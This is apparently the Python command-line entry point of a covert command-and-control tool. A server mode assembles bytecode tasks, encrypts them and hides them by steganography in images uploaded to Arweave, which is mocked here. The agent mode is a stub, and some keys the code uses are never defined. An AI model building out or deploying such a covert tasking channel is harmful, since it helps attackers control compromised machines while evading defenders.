import logging
import os
import argparse

#Configure logging before importing project modules
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("forensic.log"),
        logging.StreamHandler(),
    ]
)
logger = logging.getLogger(__name__)

#Imports
from src.keys import (
    server_load_server_keys, server_derive_allkeys, server_save_server_keys,
    agent_load_agent_keys, agent_save_agent_keys,
    advance_ratchet, load_wallet
)

from src.assembler import OPCODE_TABLE, assemble_payload
from src.crypto_wrapper import encrypt_task, decrypt_task
from src.stego import embed, extract
from src.vm import execute_bytecode
from src.arweave_interface import MockArweave, download_image, get_wallet_transactions, get_latest_image_txid

#Creates the CLI using argparse
parser = argparse.ArgumentParser(prog="MAIN", description="Covert tasking channel orchestrator")
subparser = parser.add_subparsers(dest="Command")

#Server subcommand
server_parser = subparser.add_parser(name="server", description="Server commands", prog="MAIN")

server_parser.add_argument("--keyfile", required=True, help="Path to keyfile")
server_parser.add_argument("--task", required=True, help="Space separated assembly")
server_parser.add_argument("--cover", required=True, help="Path to the cover image")
server_parser.add_argument("--mock", action="store_true", help="Use mock Arweave instead of real network")

#Agent subcommand
agent_parser = subparser.add_parser(name="agent", description="Agent commands", prog="MAIN")

agent_parser.add_argument("--keyfile", required=True, help="Path to keyfile")
agent_parser.add_argument("--wallet", required=True, help="Path to arweave wallet file")
agent_parser.add_argument("--mock", action="store_true", help="Use mock Arweave instead of real network")

agent_group = agent_parser.add_mutually_exclusive_group(required=True)

agent_group.add_argument("--bootstrap-url", help="Bootstrap task fetch URL")
agent_group.add_argument("--watch", action="store_true", help="Poll server wallet for replies")

shared_state = {}

def run_server(args):
    #Splits args.task into valid bytecode instructions
    task_string = args.task
    task_tokens = task_string.split()

    lines = []
    current_instruction = []
    for token in task_tokens:

        if token in OPCODE_TABLE:
            if current_instruction:
                lines.append(" ".join(current_instruction))
            current_instruction = [token]
        else:
            current_instruction.append(token)

    if current_instruction:
        lines.append(" ".join(current_instruction))

    #Assembles the payload
    logger.info("Step A, Payload assembly start")
    bytecode = assemble_payload(lines)
    bytecode_length = len(bytecode)
    logger.info(f"Step A, bytecode length is {bytecode_length}")

    #Encrypts the task
    payload, new_ratchet = encrypt_task(bytecode, K_ratchet)
    payload_length = len(payload)
    logger.info(f"Step A, Payload length is {payload_length}")
    logger.info(f"Step A, Payload assembly finished")

    #Embeds the payload
    logger.info(f"Step B, Payload embedding start")
    stego_image = embed(args.cover, payload, K_extract)

    stego_dir = "src/temp"
    os.makedirs(stego_dir, exist_ok=True)
    stego_path = os.path.join(stego_dir, "stego.png")
    stego_image.save(stego_path)

    logger.info(f"Step B, Embedded image saved to {stego_path}")
    logger.info(f"Step B, Payload embedding finished")

    #Uploads the stego image
    logger.info(f"Step C, Image upload start")
    if args.mock:
        mock = MockArweave()
        txid = mock.upload_image(stego_path)
        logger.info(f"Step C, Image uploaded in transaction_id {txid}")
        logger.info(f"Step C, Image upload finished")
    else:
        raise NotImplementedError("Real Arweave upload not configured")

    #Stores shared state for the agent
    shared_state["txid"] = txid
    shared_state["payload_length"] = payload_length
    shared_state["new_ratchet"] = new_ratchet
    shared_state["mock"] = mock

def run_agent(args):
    print("TEMP")

#Parses args and dispatches
if __name__ == "__main__":
    args = parser.parse_args()

    if args.Command == "server":
        run_server(args)
    elif args.Command == "agent":
        run_agent(args)
    else:
        parser.print_help()
